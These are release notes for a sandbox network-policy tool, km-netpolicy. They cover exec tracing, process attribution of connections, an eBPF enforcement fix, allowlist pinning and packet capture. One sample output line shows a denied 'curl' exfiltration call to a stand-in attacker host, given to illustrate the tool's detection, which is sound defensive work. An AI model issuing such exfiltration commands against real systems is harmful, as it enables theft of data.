<!--
  MAINTAINER NOTE — update this file BEFORE tagging each release.

  Its contents are injected VERBATIM into every GitHub release's notes,
  between the install header and goreleaser's auto-generated changelog.
  Wiring: .github/workflows/release.yml ("Load release highlights" step) →
  $KM_RELEASE_HIGHLIGHTS → .goreleaser.yaml `release.header` template.

  Keep it to the few MAJOR, human-curated additions for THIS release (the
  auto-changelog already lists every commit). HTML comments like this one
  are hidden in GitHub's rendered view. If this file is empty/absent the
  section is omitted gracefully.
-->
## 🔎 A sandbox can now tell you what it ran, not just where it went

`km-netpolicy execs | who | execs save` adds the process half of the egress census that
ships in this same release (below). Every command an agent's tools spawned — `git`,
`python`, `curl`, everything they shelled out to in turn — is now on the record, not just
what a human typed at a prompt:

```console
$ km-netpolicy execs --since 10m
14:02:03  uid=1000  pid=4211   ppid=4180   git clone --depth 1 https://github.com/... /workspace/repo
14:03:40  uid=0     pid=4501   ppid=4498   sudo yum install -y nmap
14:05:02  uid=1000  pid=4610   ppid=4180   /usr/bin/nosuchtool --scan  [FAILED ret=2]
```

`who <host>` is the verb that earns its keep — it joins that trace against the flow census
to name the process behind a connection:

```console
$ km-netpolicy who evil.example.com
14:05:02  deny     http     evil.example.com  ← pid=4610 curl -s https://evil.example.com/exfil
```

Live-verified against a real, subprocess-heavy agentic run: 12,973 exec records, real
argv/ppid/uid, and pid attribution that named the actual process behind a flagged connection.

### Attribution comes from the HTTP proxy, and needs `enforcement: ebpf` or `both`

The pid doesn't come from the eBPF ring buffer — almost all agent egress reaches the HTTP
proxy directly (that's what `HTTPS_PROXY` is for), so by the time a connection would reach
the kernel's enforcement path it's already a loopback hop with nothing left to record. The
proxy resolves the pid itself, through two of the eBPF enforcer's own pinned maps, and
stamps it on **every** flow it writes — allow included, not just denies. That only works
once those maps exist, which means this needs `spec.network.enforcement: ebpf` or `both`.
Under plain `proxy` enforcement there's no BPF loaded at all, so there's nothing to resolve
against — `who` says so rather than printing `(none)`.

### ⚠️ A bigger fix rode along: eBPF enforcement had been inert for agent traffic

Getting `who` to work surfaced something worth knowing on its own. cgroup v2 only lets a
process join a cgroup if it can write the *root* of that cgroup, which is owned by root —
so every poller that dispatched an agent turn as the sandbox user via `sudo -u sandbox` had
been silently failing to join the enforcement cgroup since `ebpf`/`both` enforcement shipped.
The eBPF programs that are supposed to block or redirect connections at the kernel level
never actually saw agent-dispatched traffic; a plain interactive `km shell` session was the
only thing that ever really landed inside the cgroup. What was actually enforcing a profile's
allowlist the whole time was the DNS resolver and the HTTP proxy — never the BPF layer.

Fixed across all 15 dispatch sites (Slack, GitHub, HackerOne, Webhook, and the `km agent run`
queue runner). **This switches BPF enforcement on for agent traffic for the first time.** If
a profile's allowlist was subtly looser than intended — loose enough that the DNS resolver
and HTTP proxy never caught it, but that the eBPF allow-trie would have — that gap was
invisible before this release and it is not invisible now. Worth a look at your profiles
before you recreate anything on `ebpf`/`both`.

### 🐛 Every eBPF-sourced flow had a backwards address

Independently found and fixed: every flow record and audit-log entry sourced from the eBPF
ring buffer carried a byte-reversed destination IP, and (for direct-connect events) a
byte-reversed port too — `github.com:443` could show up as `3.114.82.140:47873`. Decoding
the event little-endian and then re-encoding it big-endian reversed the wire bytes twice.
If you've been reading `km-netpolicy observed`/`flows` output, saved a census, or looked at
an `ebpf_network_deny` audit-log entry, treat any `src=ebpf` address/port from before this
release as unreliable — it reads backwards.

### Known, and not hidden

Two things this release doesn't pretend to have solved: running `km-netpolicy execs save`
by hand from an interactive shell currently fails with a missing-environment error (the
automatic save on shutdown still works fine — `sudo systemctl restart km-execlog` is
today's workaround); and a hard power-off still loses whatever hadn't reached disk, same as
it would for any other on-box log.

## 📍 A sandbox can say where it has been — and narrow itself to exactly that

A box already decided every egress question three different ways — the eBPF ring buffer,
the DNS proxy, the HTTP proxy — and could report none of it. `km-netpolicy` gains the
verbs that make those decisions readable, and one that acts on them:

```console
$ km-netpolicy observed
allowed (16):
  api.github.com          277 conns   last just now
  registry.npmjs.org       21 conns   last 1m ago
denied (1):
  evil.example.com          1 conns   last 9m ago

$ km-netpolicy flows --since 10m --denied
$ km-netpolicy profile          # emit a SandboxProfile from the census
$ km-netpolicy capture start|stop|status|list
```

### `pin` is the mirror image of `deny`, and it only ever narrows

Denies **union**; pins **intersect**. Effective allow is `profile allowlist ∩ pin₁ ∩ pin₂ …`,
so both operations are monotone — *"a runtime action can only narrow"* stays a property of
the data structures rather than a rule anyone has to trust. Pins live in their own
kernel-append-only file, and there is deliberately **no un-pin verb**: recovering from a
too-tight pin is `km destroy && km create`.

Allow-all needs no special case. A wide-open profile is literally `allowedDNSSuffixes: ["*"]`,
and `* ∩ observed = observed` — so pinning collapses the box to precisely what it touched.

Because it is irreversible, the default narrowing is **collapsed** (eTLD+1), not the tightest
possible reading: too loose costs a follow-up `pin`, which is always available; too tight has
no recovery. `--exact` opts into literal hosts, `--dry-run` shows both candidate lists before
anything is written, and an empty census additionally requires `--allow-empty`, because it is
mathematically deny-all and easy to trigger by accident.

### 🔒 One thing a pin can never seal, and the operator cannot override it

Under `ebpf`/`both`, `/etc/resolv.conf` points at the on-box resolver, and **DNS is neither
uid- nor cgroup-scoped** — so it answers for root too, `amazon-ssm-agent` above all, while
root's own destinations barely reach the census. The first `pin` would therefore have
NXDOMAINed `.amazonaws.com` for root: SSM dies, and with no un-pin verb there is no
`km shell` and no remote destroy. The only recovery would have been terminating the instance.

There is now a compiled-in carve-out that a pin can never seal. It is the one deliberate
exception to "pins narrow everything", and it applies to pins only — an explicit
`km-netpolicy deny .amazonaws.com` still blocks, because a deny is a named act where a pin
denies everything nobody named.

### 📦 On-demand packet capture, with mandatory bounds

`capture start|stop|status|list` runs in a root-owned daemon (pure-Go `AF_PACKET`, no libpcap)
so the sandbox user never needs `CAP_NET_RAW`. Every capture is bounded — there is no
unbounded mode — and `--max-size` **stops** the capture rather than ring-rotating, because a
ring keeps the last N bytes and discards the start of the trace, which is usually the part a
failure question needs.

### 🐛 A silent S3 denial, fixed on the way past

The sandbox role's only write grant was `transcripts/${sandbox_id}/*`. `learn/` — the flush
target `km shell --learn` has used since it existed — **never had a grant, and every
`PutObject` there had been 403ing since day one.** It was invisible because the failure is a
`logger.Warn` and an SSM fallback quietly kept learn mode working. The missing grant was the
bug; the soft failure was correct and was left alone.

### Observation is unconditional — no profile field, no dormant case

The census runs on every sandbox regardless of `learnMode` or enforcement mode. A facility
that can only narrow, and that only reports what already happened, cannot widen a policy by
being present — and the boxes where narrowing matters most are exactly the wide-open ones no
profile would have thought to opt in. Userdata changes for **every** profile as a result.

### ⚠️ Deploy surface — heavier than v0.8.10

This changes rendered user-data and IAM, so it's not a `make build`-only upgrade:

```bash
make build && make build-lambdas && km init --dry-run=false
```

Not `--sidecars` — that rebuilds the sidecar binary but not the create-handler zip that
renders user-data or the IAM policy this needs.

**Existing sandboxes need `km destroy && km create` to gain any of this.** The daemon and
the userdata that wires it up are baked in at boot, not fetched fresh on a running box.

See `docs/exec-capture.md` and `docs/egress-census.md`.
